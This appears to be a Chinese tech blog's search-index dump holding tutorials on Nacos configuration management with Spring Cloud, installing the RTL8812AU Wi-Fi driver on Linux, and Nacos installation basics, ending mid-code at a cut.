入门案例3.0、版本说明在本案例中，Spring Cloud 的版本是 Greenwich.SR6，对应的 Spring Boot 版本是 2.1.18.RELEASE，对应的 Nacos Config Spring Cloud 版本为 2.1.3.RELEASE，Nacos Server 的版本为 1.4.0，Nacos 官方版本说明可以看这里，点击下载完整的案例代码。 3.1、发布配置第一步：创建名称为 dev 的命名空间 第二步：在 dev 命名空间下新增两项配置，具体的配置内容如下： 123456Namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18Data ID: service-1.yamlGroup: TEST_GROUP配置格式: YAML配置内容: common: name: service-1-config 123456Namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18Data ID: service-2.yamlGroup: TEST_GROUP配置格式: YAML配置内容: common: name: service-2-config 3.2、创建 Maven 父工程在 Maven 父工程里面配置好工程需要的父级依赖，目的是为了更方便管理与简化配置，具体配置如下。特别注意，Nacos Spring Cloud Starter 版本 2.1.x.RELEASE 对应的是 Spring Boot 2.1.x 版本，版本 2.0.x.RELEASE 对应的是 Spring Boot 2.0.x 版本，版本 1.5.x.RELEASE 对应的是 Spring Boot 1.5.x 版本，Nacos 官方版本说明可以看这里。 12345678910111213141516171819202122232425262728293031323334353637383940&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.1.18.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;properties&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;project.reporting.outputEncoding&gt;UTF-8&lt;/project.reporting.outputEncoding&gt; &lt;spring-cloud.version&gt;Greenwich.SR6&lt;/spring-cloud.version&gt; &lt;nacos-config-spring-cloud.version&gt;2.1.3.RELEASE&lt;/nacos-config-spring-cloud.version&gt;&lt;/properties&gt;&lt;!-- 管理依赖 --&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;${spring-cloud.version}&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-config&lt;/artifactId&gt; &lt;version&gt;${nacos-config-spring-cloud.version}&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;&lt;!-- 利用传递依赖，公共部分 --&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 特别注意 若使用的 Spring Cloud 是高版本，例如 Spring Cloud 2021.0.1，则还需要引入 spring-cloud-starter-bootstrap 依赖（如下所示），否则 Spring Cloud 无法读取项目中的 bootstrap.yml 配置文件，导致 Maven 引入 Nacos 配置中心后无法生效，详细说明请看 这里。 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-bootstrap&lt;/artifactId&gt;&lt;/dependency&gt; 3.3、创建 Service 1 工程创建 Service 1 的 Maven 工程，配置工程里的 pom.xml 文件，需要引入 spring-cloud-starter-alibaba-nacos-config 依赖 1234&lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-config&lt;/artifactId&gt;&lt;/dependency&gt; 创建 Service 1 的主启动类 1234567@SpringBootApplicationpublic class Service1Application { public static void main(String[] args) { SpringApplication.run(Service1Application.class, args); }} 创建 Service 1 的 Controller 测试类，添加 Spring Cloud 原生 @RefreshScope 注解来实现配置自动更新，或者手动通过 ConfigurableApplicationContext.getEnvironment().getProperty() 来实时获取最新的配置信息 12345678910111213@RestController@RequestMapping("/config")@RefreshScopepublic class ConfigController { @Value("${common.name}") private String config2; @GetMapping("/get") public String get() { return config2; }} 添加 Service 1 需要的 bootstrap.yml 配置文件到工程中 12345678910111213server: port: 56010spring: application: name: service-1 cloud: nacos: config: server-addr: 127.0.0.1:8848 #配置中心的地址 namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18 #命名空间 group: TEST_GROUP #配置分组 file-extension: yaml #由于当前环境对应的profile为空，这里的Data ID的名称就是application的name加上file-extension，即service-1.yaml 3.4、创建 Service 2 工程创建 Service 2 的 Maven 工程，配置工程里的 pom.xml 文件，需要引入 spring-cloud-starter-alibaba-nacos-config 依赖 1234&lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-config&lt;/artifactId&gt;&lt;/dependency&gt; 创建 Service 2 的主启动类 1234567@SpringBootApplicationpublic class Service2Application { public static void main(String[] args) { SpringApplication.run(Service2Application.class, args); }} 创建 Service 2 的 Controller 测试类，添加 Spring Cloud 原生 @RefreshScope 注解来实现配置自动更新，或者手动通过 ConfigurableApplicationContext.getEnvironment().getProperty() 来实时获取最新的配置信息 1234567891011121314151617181920@RestController@RequestMapping("/config")public class ConfigController { @Value("${common.name}") private String config2; @Autowired private ConfigurableApplicationContext applicationContext; @GetMapping("/get") private String get() { return config2; } @GetMapping("/getRealTime") private String getRealTime() { return applicationContext.getEnvironment().getProperty("common.name"); }} 添加 Service 2 需要的 bootstrap.yml 配置文件到工程中 12345678910111213server: port: 56011spring: application: name: service-2 cloud: nacos: config: server-addr: 127.0.0.1:8848 #配置中心的地址 namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18 #命名空间 group: TEST_GROUP #配置分组 file-extension: yaml #由于当前环境对应的profile为空，这里的Data ID的名称就是application的name加上file-extension，即service-2.yaml 3.5、测试应用程序 分别启动 nacos-service-1、nacos-service-2 应用 浏览器访问 http://127.0.0.1:56010/config/get，若响应结果为 service-1-config，则说明 nacos-service-1 应用运行正常 通过 Nacos 的控制台更改 Data ID 为 service-1.yaml 的配置内容，然后再次访问 http://127.0.0.1:56010/config/get，若响应结果发生了变化，则说明 nacos-service-1 应用可以实时感知到 Nacos Server 的配置变更 参考步骤二和步骤三，测试 nacos-service-2 应用即可 Nacos Config Spring Cloud 常用配置配置信息的优先级 若本地配置文件（YML、Properties）和 Nacos 配置中心分别存放了相同的配置信息，Nacos Config Spring Cloud 会优先使用配置中心的配置信息，即配置中心的信息会覆盖本地的配置信息。 常用的配置参数在上面的 bootstrap.yaml 配置文件中，之所以需要配置 spring.application.name，是因为它是构成 Nacos 配置管理 dataId 字段的一部分，在 Nacos Spring Cloud 中，dataId 的完整格式如下： 1${prefix}-${spring.profiles.active}.${file-extension} group 默认为 DEFAULT_GROUP，可以通过 spring.cloud.nacos.config.group 来配置 prefix 默认为 spring.application.name 的值，也可以通过配置项 spring.cloud.nacos.config.prefix 来配置 namespace 默认为 public 命名空间的 ID，可以通过 spring.cloud.nacos.config.namespace 来配置，这里的值是 Namespace 的 ID file-exetension 为配置内容的数据格式，可以通过配置项 spring.cloud.nacos.config.file-extension 来配置，目前只支持 properties 和 yaml 类型 spring.profiles.active 即为当前环境对应的 profile。特别注意：当 spring.profiles.active 为空时，对应的连接符 - 也将不存在，dataId 的拼接格式会变成 ${prefix}.${file-extension} 完整的配置参数 配置文件加载顺序若项目中同时存在 bootstrap.yaml 和 application.yml 配置文件，那么 Nacos Config Spring Cloud 的配置信息必须写在 bootstrap.yml 配置文件里，因为 Spring Boot 会优先加载 bootstrap.yml 配置文件。值得一提的是，bootstrap.yml 作用于应用程序上下文的引导阶段，bootstrap.yml 由父 Spring ApplicationContext 加载。 自定义 Data ID 配置自定义扩展 Data ID 配置在日常项目开发中，单个微服务可能拥有多个配置文件，对应的就是 Nacos 中的多个 Data ID（配置集），例如包括全局配置、局部配置等（如下图），而上面的案例只能使用配置单一的 Data ID（配置集），无法满足实际的开发需求。但 Nacos Config Spring CLoud 提供了自定义扩展 Data ID 的配置，以此来解决该问题。在以下案例中，首先通过 Nacos 的控制台新增了全局配置（extension-config-01.yaml）与默认配置（extension-config-02.yaml），然后在 bootstrap.yaml 配置文件中通过 extension-configs 标签来配置多个 Data ID（配置集），点击下载完整的案例代码。 使用场景 发布配置 123456Namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18Data ID: extension-config-01.yamlGroup: GLOBAL_GROUP配置格式: YAML配置内容: common: address: 127.0.0.1 123456Namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18Data ID: extension-config-02.yamlGroup: DEFAULT_GROUP配置格式: YAML配置内容: common: threads: 2000 配置示例 值得一提的是，在旧版 Nacos Config Spring Cloud 中，使用的标签是 ext-config，下标都是从零开始，配置示例如下： 12345678910111213141516171819server: port: 56010spring: application: name: service cloud: nacos: config: server-addr: 127.0.0.1:8848 #配置中心的地址 namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18 #命名空间 extension-configs[0]: data-id: extension-config-01.yaml group: GLOBAL_GROUP refresh: true extension-configs[1]: data-id: extension-config-02.yaml group: DEFAULT_GROUP refresh: true 通过 spring.cloud.nacos.config.extension-config[n].data-id 的配置方式来支持多个 Data ID 的配置 通过 spring.cloud.nacos.config.extension-config[n].group 的配置方式自定义 Data ID 所在的组，不配置的话，默认是 DEFAULT_GROUP 通过 spring.cloud.nacos.config.extension-config[n].refresh 的配置方式来控制该 Data ID 在配置变更时，是否支持在应用中可动态刷新，感知到最新的配置值，默认是不支持的 多个 Data ID 同时配置时，优先级关系是 spring.cloud.nacos.config.extension-config[n].data-id 其中 n 的值越大，优先级越高 spring.cloud.nacos.config.extension-config[n].data-id 的值必须带文件扩展名，文件扩展名支持 properties、yaml/yml，此时 spring.cloud.nacos.config.file-extension 的配置参数对自定义扩展配置的 Data ID 文件扩展名没有影响 Java 代码 12345678910111213141516@RestController@RequestMapping("/config")@RefreshScopepublic class ConfigController { @Value(("${common.address}")) private String address; @Value("${common.threads}") private String threads; @GetMapping("/get") public String get() { return "address: " + address + " threads: " + threads; }} 自定义共享 Data ID 配置为了更加清晰地在多个应用间配置共享的 Data ID，可以使用 spring.cloud.nacos.config.shared-dataids 标签来定义 Data ID。值得一提的是，在新版的 Nacos Config Spring Cloud 中，使用的标签升级为 spring.cloud.nacos.config.shared-configs。当使用自定义共享 Data ID 配置的方式时，只能读取到配置分组（Group）为 DEFAULT_GROUP 的 Data ID，如果 Data ID 归属于其他非默认的配置分组（DEFAULT_GROUP），则无法读取对应的配置信息，所以自定义共享 Data ID 配置的方式在实际开发中使用频率较低。 配置示例 12345678910111213server: port: 56010spring: application: name: service cloud: nacos: config: server-addr: 127.0.0.1:8848 #配置中心的地址 namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18 #命名空间 shared-dataids: shared-config-01.yaml,shared-config-02.yaml refreshable-dataids: shared-config-01.yaml 通过 spring.cloud.nacos.config.shared-dataids 来支持多个共享 Data ID 的配置，多个之间用逗号隔开 通过 spring.cloud.nacos.config.refreshable-dataids 来支持哪些共享配置的 Data ID 在配置变化时，在应用中是否可动态刷新，感知到最新的配置值，多个 Data ID 之间用逗号隔开。如果没有配置时，默认情况下所有共享配置的 Data ID 都不支持动态刷新 通过 spring.cloud.nacos.config.shared-dataids 来支持多个共享配置的 Data ID 时， 多个共享配置间的优先级关系由配置出现的先后顺序来决定，即后面的优先级要高于前面 通过 spring.cloud.nacos.config.shared-dataids 来配置时，Data ID 必须带文件扩展名，文件扩展名既可支持 properties、yaml/yml，此时 spring.cloud.nacos.config.file-extension 的配置参数对自定义共享配置的 Data ID 文件扩展名没有影响 spring.cloud.nacos.config.refreshable-dataids 配置哪些 Data ID 需要支持动态刷新时，Data ID 的值也必须明确给出文件扩展名 配置加载的优先级新版的 Nacos Config Spring Cloud 目前提供了三种配置能力从 Nacos 拉取相关的配置，具体如下： A: 通过 spring.cloud.nacos.config.shared-configs 支持多个共享 Data ID 的配置 B: 通过 spring.cloud.nacos.config.extension-configs[n].data-id 的方式支持多个扩展 Data ID 的配置 C: 通过内部相关规则（应用名 或者 应用名 + Profile），即 ${prefix}-${spring.profiles.active}.${file-extension} 规则来自动生成相关的 Data ID 配置 当三种方式共同使用时，优先级关系是： A &lt; B &lt; C 完全关闭配置若希望完全关闭 Nacos Config Spring Cloud，可以通过设置 spring.cloud.nacos.config.enabled=false 来关闭。 Nacos Config Spring Cloud 原理浅析自动注入Nacos Config Spring Cloud Starter 实现了 org.springframework.cloud.bootstrap.config.PropertySourceLocator 接口，并将优先级设置成了最高。在 Spring Cloud 应用启动阶段，会主动从 Nacos Server 端获取对应的数据，并将获取到的数据转换成 PropertySource 且注入到 Environment 的 PropertySources 属性中，所以使用 @Value 注解也能直接获取 Nacos Server 端配置的内容。 动态刷新Nacos Config Spring Cloud Starter 默认为所有获取数据成功的 Nacos 的配置项添加了监听功能，在监听到服务端配置发生变化时会实时触发 org.springframework.cloud.context.refresh.ContextRefresher 的 refresh() 方法 。如果需要对 Bean 进行动态刷新，给类添加 @RefreshScope 或 @ConfigurationProperties 注解即可。 补充内容Endpoint 支持Endpoint 信息查看Spring Boot 支持这一点，Nacos Config 也可以使用 Endpoint 来暴露信息。在 Maven 中添加 spring-boot-starter-actuator 依赖，并配置端点的访问策略。 Spring Boot 1.x 中添加端点访问策略的配置 management.security.enabled=false Spring Boot 2.x 中添加端点访问策略的配置 management.endpoints.web.exposure.include=* Spring Boot 1.x 中 Nacos Config 端点查看的 URL 是 http://127.0.0.1:18084/nacos_config Spring Boot 2.x 中 Nacos Config 端点查看的 URL 如下所示，不同 Nacos Config 版本可能有所差异 http://127.0.0.1:18084/actuator/nacosconfig http://127.0.0.1:18084/actuator/nacos-config 值得一提的是，http://127.0.0.1:18084/actuator/nacosconfig 的 127.0.0.1:18084 是 Spring Cloud 应用（业务）占用的 IP 和端口 Endpoint 配置示例 引入 Actuator 依赖 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt; 配置端点的访问策略（Spring Boot 2.x） 12345678management: endpoints: web: exposure: include: "*" endpoint: health: show-details: ALWAYS 端点访问策略配置 management.endpoint.health.show-details=ALWAYS：何时显示完整的健康信息，默认为 NEVER 都不展示。可选 WHEN_AUTHORIZED 当经过授权的用户；可选 ALWAYS 总是显示。 management.endpoints.web.exposure.include=*：需要开放的端点，默认值只打开 health 和 info 这两个端点。通过设置 * ，可以开放所有端点（生产环境不建议这样配置）。 下篇 - Nacos 入门教程 - 配置管理（高级篇） Nacos 入门教程 - 配置管理高级篇 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"微服务"},{title:"Linux 安装 RTL8812AU 无线 USB 网卡驱动",url:"/posts/e173757f.html",text:'前言 本文主要介绍如何在 Linux 系统里安装 RTL8812AU 无线 USB 网卡驱动，适用于 Debian、Ubuntu 18/19/20、Centos7/8，其中 Linux 的内核版本必须为大于等于 3.10。 检测系统是否正确识别 RTL8812AU 无线网卡 12# lsusb | grep RTL8812AUBus 003 Device 008: ID 0bda:8812 Realtek Semiconductor Corp. RTL8812AU 802.11a/b/g/n/ac 2T2R DB WLAN Adapter Ubuntu 18/19/20 手动安装 RTL8812AU 无线网卡驱动 12# 系统环境Linux Ubuntu-20 5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 12345678910111213141516171819# 安装工具软件# apt-get install -y git make# 克隆源码# git clone https://github.com/gnab/rtl8812au.git# 进入源码目录# cd rtl8812au# 编译驱动# make# 安装驱动# cp 8812au.ko /lib/modules/$(uname -r)/kernel/drivers/net/wireless# 更新模块依赖# depmod# 提示：执行完以上步骤后，正常情况下就可以在系统的设置面板里看到 RTL8812AU 无线 USB 网卡搜索到的 WiFi 列表；如果网卡驱动安装后不生效，可以尝试重启系统。 Ubuntu 18/19/20 通过 DKMS 安装 RTL8812AU 无线网卡驱动 当手动安装 RTL8812AU 无线网卡驱动后，如果 Linux 系统的内核版本升级了，那么 RTL8812AU 驱动就会失效，导致需要重新安装驱动才能正常使用无线网卡。为了解决 Linux 系统内核版本升级带来的问题，可以 通过 DKMS 自动重建并安装网卡驱动到新的内核中。值得注意的是，若通过 DKMS 安装网卡驱动，则无需再使用上面的方法手动安装网卡驱动了。 1234567891011121314151617181920# 安装工具软件# apt-get install -y git make build-essential dkms# 克隆源码# git clone https://github.com/gnab/rtl8812au.git# 进入源码目录# cd rtl8812au# 将网卡驱动安装到DKMS（若命令执行出错，请看本文后面给出的解决办法）# make dkms_install# 查看DKMS是否正确安装网卡驱动# dkms status8812au, 4.2.3, 5.4.0-42-generic, x86_64: installed# 配置系统引导时自动加载网卡驱动# echo 8812au | sudo tee -a /etc/modules# 提示：执行完以上步骤后，正常情况下就可以在系统的设置面板里看到 RTL8812AU 无线 USB 网卡搜索到的 WiFi 列表；如果网卡驱动安装后不生效，可以尝试重启系统。 若执行 make dkms_install 命令出现错误 Makefile:1085: *** unterminated call to function \'shell\': missing \')\'. Stop，此时可以更改 Makefile 的文件内容后，再次执行 make dkms_install 等命令。 123456789101112# 进入源码目录# cd rtl8812au# 查看网卡驱动的版本号# cat include/rtw_version.hdefine DRIVERVERSION "v4.2.3"# 编辑Makefile文件，手动指定网卡驱动的具体版本号# vim MakefileDRIVER_VERSION = 4.2.3# 提示：即找到Makefile文件中的 DRIVER_VERSION = $(shell grep "#define DRIVERVERSION" include/rtw_version.h | awk \'{print $$3}\' | tr -d v\\")，并将其修改为 DRIVER_VERSION = 4.2.3 若需要从 DKMS 中卸载网卡驱动，可以执行以下命令： 12345# 进入源码目录# cd rtl8812au# 通过DKMS卸载网卡驱动# make dkms_remove Centos 7/8 YUM 安装 RTL8812AU 无线网卡驱动 由于亲测在 Centos7 系统环境下，通过上述的方法（手动 + DKMS）安装 RTL8812AU 无线网卡的驱动后，无法使无线网卡正常工作，因此可以通过 YUM 包来安装对应的网卡驱动。 12# 系统环境Linux Centos-7 3.10.0-1160.6.1.el7.x86_64 #1 SMP Tue Nov 17 13:59:11 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 1234567# 安装网卡驱动# yum install kmod-rtl8812au# 查看网卡驱动是否安装成功（正常情况下，需要将无线USB网卡插到电脑上才会显示具体的驱动信息）# lsmod| grep "XX"88XXau 2189305 0cfg80211 710816 1 88XXau 可以使用以下常用的命令来判断 RTL8812AU 无线网卡是否正常工作，当然也可以在系统的设置面板里查看无线网卡的工作状态： 1234567891011# ifconfigwlp0s20u5: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500inet 192.168.0.117 netmask 255.255.255.0 broadcast 192.168.0.255inet6 fe80::bbf5:446d:e3ec:90fd prefixlen 64 scopeid 0x20inet6 2606:a000:810c:9300:9c04:74bc:9909:73d prefixlen 64 scopeid 0x0inet6 2606:a000:810c:9300::6 prefixlen 128 scopeid 0x0ether c4:41:1e:5d:7f:98 txqueuelen 1000 (Ethernet)RX packets 1480 bytes 999935 (976.4 KiB)RX errors 0 dropped 0 overruns 0 frame 0TX packets 1724 bytes 484480 (473.1 KiB)TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 12345678910# iwconfigwlp0s20u5 IEEE 802.11AC ESSID:"SBG6900AC" Nickname:"WIFI@REALTEK"Mode:Managed Frequency:5.745 GHz Access Point: 5C:E3:0E:96:D7:A0Bit Rate:174 Mb/s Sensitivity:0/0Retry:off RTS thr:off Fragment thr:offEncryption key:------- Security mode:openPower Management:offLink Quality=83/100 Signal level=36/100 Noise level=0/100Rx invalid nwid:0 Rx invalid crypt:0 Rx invalid frag:0Tx excessive retries:0 Invalid misc:0 Missed beacon:0 123# nmcli conNAME UUID TYPE DEVICESBG6900AC fd0097f7-2c89-4a2b-bb8e-a23e5d197ac2 wifi wlp0s20u5 12345# nmcli dev wifiIN-USE SSID MODE CHAN RATE SIGNAL BARS SECURITY TP-LINK_3BC402 Infra 6 270 Mbit/s 47 ▂▄__ -- Tenda_F73CF8 Infra 11 130 Mbit/s 37 ▂▄__ WPA1 WPA2 Tenda_58D840 Infra 10 130 Mbit/s 14 ▂___ WPA1 WPA2 参考资料 https://github.com/gnab/rtl8812au https://github.com/gnab/rtl8812au/issues/208 https://github.com/gnab/rtl8812au/issues/115 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux"},{title:"Nacos 入门教程 - 配置管理基础篇",url:"/posts/ab6959cb.html",text:'配置中心介绍什么是配置中心在集中式开发时代，配置文件已经基本足够了，因为那时配置的管理通常不会成为一个很大的问题。但是在互联网时代，应用都是分布式系统，部署在 N 台服务器上，想要去线上一台台地重启机器肯定不靠谱，并且维护成本也很高，所以配置中心应运而生。配置中心被用作集中管理不同环境（Dev、Test、Stage、Prod）和不同集群配置，以及在修改配置后将实时动态推送到应用上进行刷新。配置中心应具备的功能如下： Open API 业务无关性 高可用集群 配置生效监控 配合灰度与更新 一致性 K-V 存储 统一配置实时推送 配置全局恢复、备份与历史 主流配置中心对比 Spring Cloud Config、Netflix Archaius、Apollo、Disconf（已停止维护） 对比图一 Spring Cloud Config、Netflix Archaius、Apollo、Disconf（已停止维护） 对比图二 Nacos 简介Nacos 概述Nacos 是构建以 “服务” 为中心的现代应用架构 (例如微服务范式、云原生范式) 的服务基础设施，可以更敏捷和容易地构建、交付和管理微服务平台。Nacos 提供了一组简单易用的特性集，致力于快速实现动态服务发现、服务配置、服务元数据及流量管理。更多资料可参考：Nacos 项目、Nacos 官网、Nacos 官方中文文档、Nacos 官方示例代码、Nacos 官方博客 Nacos 功能动态配置服务 动态配置服务能够以中心化、外部化和动态化的方式管理所有环境的配置。动态配置消除了配置变更时重新部署应用和服务的需要。配置中心化管理让实现无状态服务更简单，也让按需弹性扩展服务更容易。 服务发现与服务健康监测 动态服务发现对以服务为中心的（例如微服务和云原生）应用架构方式非常关键。Nacos 支持 DNS-Based 和 RPC-Based（Dubbo、gRPC） 模式的服务发现。Nacos 也提供实时健康检查，以防止将请求发往不健康的主机或服务实例。借助 Nacos，可以更容易地为服务实现断路器。 动态 DNS 服务 通过支持权重路由，动态 DNS 服务能够轻松实现中间层负载均衡、更灵活的路由策略、流量控制以及简单数据中心内网的简单 DNS 解析服务。动态 DNS 服务还能更容易地实现以 DNS 协议为基础的服务发现，以消除耦合到厂商私有服务发现 API 上的风险。 服务及其元数据管理 Nacos 能从微服务平台建设的视角管理数据中心的所有服务及元数据，包括管理服务的描述、生命周期、服务的静态依赖分析、服务的健康状态、服务的流量管理、路由及安全策略、服务的 SLA 以及最首要的 metrics 统计数据。 Nacos 特性易于使用 动态配置管理、服务发现和动态的一站式解决方案 20 多种开箱即用的以服务为中心的架构特性 基本符合生产要求的轻量级易用控制台 生产等级 脱胎于历经阿里巴巴 10 年生产验证的内部产品 支持具有数百万服务的大规模场景 具备企业级 SLA 的开源产品 更适应云架构 无缝支持 Kubernetes 和 Spring Cloud 在主流公共云上更容易部署和运行（例如阿里云和 AWS） 多租户和多环境支持 丰富的应用场景 支持限流、大促销预案和异地多活 直接支持或稍作扩展即可支持大量有用的互联网应用场景 流量调度和服务治理 Nacos 生态图如 Nacos 生态图所示，Nacos 无缝支持一些主流的开源生态，包括 Spring Cloud、Apache Dubbo、Dubbo Mesh、gRPC、Kubernetes 、CNCF 等。 Nacos 安装安装 Nacos安装环境准备Nacos 依赖 Java 环境运行，因此需要提前安装并配置 JDK，如果是从源码开始构建并运行 Nacos，还需要为此配置 Maven 环境，Nacos 依赖的软件环境如下： 64 Bit OS，支持 Unix/Linux/Mac/Windows 64 Bit JDK 1.8+ Maven 3.2.x+ Nacos 1.4.0 通过源码编译安装12345678910111213141516171819202122232425262728# 拉取源码$ git clone git@github.com:alibaba/nacos.git# 进入源码目录$ cd nacos# 编译打包$ mvn -Prelease-nacos clean install -U# 或者指定编译时跳过测试$ mvn -Prelease-nacos clean install -U -f pom.xml -Dmaven.test.skip=true# 进入编译后的bin目录$ cd distribution/target/nacos-server-1.4.0/nacos/bin# 单机模式下启动Nacos服务，默认端口为8848，默认使用内置数据源$ sh startup.sh -m standalone# 查看Nacos的进程状态$ ps -aux|grep nacos# 查看Nacos的端口状态$ netstat -anp|grep 8848# 关闭Nacos服务$ sh shutdown.sh# 提示： Nacos启动的日志文件路径为： nacos/distribution/target/nacos-server-1.4.0/nacos/logs/start.out 通过下载二进制包安装Nacos 下载地址点这里，下载后解压即可运行。 12345678910111213141516171819# 解压$ tar -xvf nacos-server-1.4.0.tar.gz# 进入bin目录$ cd nacos/bin# 单机模式下启动Nacos服务，默认端口为8848，默认使用内置数据源$ sh startup.sh -m standalone# 查看Nacos的进程状态$ ps -aux|grep nacos# 查看Nacos的端口状态$ netstat -anp|grep 8848# 关闭Nacos服务$ sh shutdown.sh# 提示： Nacos启动的日志文件路径为： nacos/logs/start.out 访问 Nacos 的 Web 控制台浏览器访问 http://127.0.0.1:8848/nacos，默认登录的用户名和密码为 nacos/nacos。 Open API 配置管理测试Nacos 启动成功后，可通过 Nacos 提供的 HTTP API 验证 Nacos 服务运行是否正常。 123# 新增配置信息到Nacos$ curl -X POST "http://127.0.0.1:8848/nacos/v1/cs/configs?dataId=nacos.cfg.dataId&amp;group=test&amp;content=HelloWorld"true 刷新 Nacos 的 Web 控制台，可以看到刚新增的配置信息如下： 123# 从Nacos获取配置信息$ curl -X GET "http://127.0.0.1:8848/nacos/v1/cs/configs?dataId=nacos.cfg.dataId&amp;group=test"HelloWorld 外部 MySQL 数据库支持（持久化配置）单机模式下 Nacos 默认使用嵌入式数据库 derby 来存储数据，若想使用外部 MySQL 数据库存储 Nacos 的数据，需要进行以下操作： 安装 MySQL 5.6.5+ 下载 Nacos Server 的二进制安装包并解压 创建数据库 nacos_config，执行 SQL 初始化脚本，数据库初始化脚本的路径为：${nacos-home}/conf/nacos-mysql.sql 12345678910111213141516171819202122232425262728# 创建数据库mysql&gt; create database nacos_config default character set utf8;# 切换数据库mysql&gt; use nacos_config;# 执行SQL初始化脚本mysql&gt; source ${nacos-home}/conf/nacos-mysql.sql;# 查看数据库表mysql&gt; show tables;+------------------------+| Tables_in_nacos_config |+------------------------+| config_info || config_info_aggr || config_info_beta || config_info_tag || config_tags_relation || group_capacity || his_config_info || permissions || roles || tenant_capacity || tenant_info || users |+------------------------+12 rows in set (0.00 sec) 修改 ${nacos-home}/conf/application.properties 配置文件，增加支持 MySQL 数据源的配置信息（目前只支持 MySQL），并添加 MySQL 数据库的 URL、用户名、密码，最后重新启动 Nacos 服务即可，配置示例如下： 123456spring.datasource.platform=mysqldb.num=1db.url.0=jdbc:mysql://127.0.0.1:3306/nacos_config?characterEncoding=utf8&amp;connectTimeout=1000&amp;socketTimeout=3000&amp;autoReconnect=true&amp;useUnicode=true&amp;useSSL=false&amp;serverTimezone=UTCdb.user=rootdb.password=123456 若希望使用 Nacos Server 内置的数据源（嵌入式数据库），可以使用 -p embedded 参数来启动 Nacos Server 1sh startup.sh -p embedded Nacos 配置入门案例第一步：点击新增配置按钮浏览器访问 http://127.0.0.1:8848/nacos，打开 Nacos 的 Web 控制台，并找到菜单 配置管理 &gt; 配置列表，然后点击 新增 按钮： 第二步：新增配置信息在新增配置信息的表单里，填写如下的内容，然后点击 发布 按钮即可。特别注意的是，DataId 默认是以 properties 作为默认的文件扩展名。 第三步：查询配置信息 第四步：调用 Java API 获取 Nacos 的配置信息12345&lt;dependency&gt; &lt;groupId&gt;com.alibaba.nacos&lt;/groupId&gt; &lt;artifactId&gt;nacos-client&lt;/artifactId&gt; &lt;version&gt;1.4.0&lt;/version&gt;&lt;/dependency&gt; 1234567891011121314151617181920212223import com.alibaba.nacos.api.NacosFactory;import com.alibaba.nacos.api.config.ConfigService;import com.alibaba.nacos.api.exception.NacosException;import java.util.Properties;/** * 从Nacos读取配置信息 * @author clay */public class NacosDemoApplicaton { public static void main(String[] args) throws NacosException { String serverAddr = "127.0.0.1:8848"; String dataId = "nacos_simple_demo.yaml"; String group = "DEFAULT_GROUP"; Properties properties = new Properties(); properties.put("serverAddr", serverAddr); ConfigService configService = NacosFactory.createConfigService(properties); String content = configService.getConfig(dataId, group, 1000); 